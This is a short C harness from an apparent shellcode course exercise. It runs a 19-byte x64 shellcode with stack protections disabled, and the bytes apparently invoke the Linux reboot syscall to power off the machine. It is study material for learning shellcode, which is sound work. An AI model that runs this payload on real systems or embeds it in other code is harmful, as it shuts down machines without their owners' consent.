/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  03.02.2019
Note:          x64
Compiler:      gcc -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\xba\xdc\xfe\x21\x43\xbe\x69\x19\x12\x28"
"\xbf\xad\xde\xe1\xfe\xb0\xa9\x0f\x05";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
